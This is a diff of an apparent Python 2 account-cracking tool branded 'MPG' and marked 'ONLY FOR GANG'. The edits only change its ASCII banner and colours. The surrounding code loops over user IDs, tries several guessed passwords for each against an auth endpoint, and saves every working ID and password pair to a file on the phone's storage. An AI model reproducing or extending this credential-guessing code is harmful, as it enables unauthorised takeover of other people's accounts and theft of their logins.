@@ -52,15 +52,15 @@ Y='\033[1;93m'
 #Dev:Xtylish Pathani
 #### LOGO ####
 logo = """  
-\033[1;97m  ****************"****************
-\033[1;96m  ███╗░░░███╗██████╗░░██████╗░
-\033[1;95m  ████╗░████║██╔══██╗██╔════╝░
-\033[1;94m  ██╔████╔██║██████╔╝██║░░██╗░
-\033[1;93m  ██║╚██╔╝██║██╔═══╝░██║░░╚██╗
-\033[1;92m  ██║░╚═╝░██║██║░░░░░╚██████╔╝
-\033[1;91m  ╚═╝░░░░░╚═╝╚═╝░░░░░░╚═════╝░ 
-\033[1;92m                    🄱🅁🄰🄽🄳
-\033[1;97m  *********************************
+\033[1;97m ****************"******************
+\033[1;96m *███╗░░░███╗██████╗░░██████╗░ *F*
+\033[1;95m *████╗░████║██╔══██╗██╔════╝░ *A*
+\033[1;94m *██╔████╔██║██████╔╝██║░░██╗░ *M*
+\033[1;93m *██║╚██╔╝██║██╔═══╝░██║░░╚██╗ *I*
+\033[1;92m *██║░╚═╝░██║██║░░░░░╚██████╔╝ *L*
+\033[1;91m *╚═╝░░░░░╚═╝╚═╝░░░░░░╚═════╝░ *Y*
+\033[1;92m *                 🄱🅁🄰🄽🄳        *
+\033[1;97m ***********************************
 \033[1;93m  SCRIPT MAKER  :  XTYLISH PATHANI
 \033[1;93m  GANG OWNER    :  ZAIN X MOIZ
 \033[1;93m  NOTE          :  ONLY FOR GANG 
@@ -434,7 +434,7 @@ def a_s():
     print ' \033[1;92mCrack Running\033[1;94m '
     time.sleep(0.5)
     print 47 * '-'
-    print '\t\033[1;92mITz MPG BRAND \033[1;94m'
+    print '\t\033[1;95mITz MPG BRAND \033[1;94m'
     print 47 * '-'
     
     def main(arg):
@@ -445,7 +445,7 @@ def a_s():
             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = header).text
             q = json.loads(data)
             if 'loc' in q:
-                print '\033[1;95m[MPG-OK]➤ ' + uid + ' | ' + pass1
+                print '\033[1;92m[MPG-OK]➤ ' + uid + ' | ' + pass1
                 ok = open('/sdcard/ids/MRP_OK.txt', 'a')
                 ok.write(uid + ' | ' + pass1 + '\n')
                 ok.close()
@@ -460,7 +460,7 @@ def a_s():
                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = header).text
                 q = json.loads(data)
                 if 'loc' in q:
-                    print '\033[1;95m[MPG-OK]➤ ' + uid + ' | ' + pass2
+                    print '\033[1;92m[MPG-OK]➤ ' + uid + ' | ' + pass2
                     ok = open('/sdcard/ids/MRP_OK.txt', 'a')
                     ok.write(uid + ' | ' + pass2 + '\n')
                     ok.close()
@@ -475,7 +475,7 @@ def a_s():
                     data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers = header).text
                     q = json.loads(data)
                     if 'loc' in q:
-                        print '\033[1;95m[MPG-OK]➤ ' + uid + ' | ' + pass3
+                        print '\033[1;92m[MPG-OK]➤ ' + uid + ' | ' + pass3
                         ok = open('/sdcard/ids/MRP_OK.txt', 'a')
                         ok.write(uid + ' | ' + pass3 + '\n')
                         ok.close()
@@ -490,7 +490,7 @@ def a_s():
                         data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers = header).text
                         q = json.loads(data)
                         if 'loc' in q:
-                            print '\033[1;95m[MPG-OK]➤ ' + uid + ' | ' + pass4
+                            print '\033[1;92m[MPG-OK]➤ ' + uid + ' | ' + pass4
                             ok = open('/sdcard/ids/MRP_OK.txt', 'a')
                             ok.write(uid + ' | ' + pass4 + '\n')
                             ok.close()
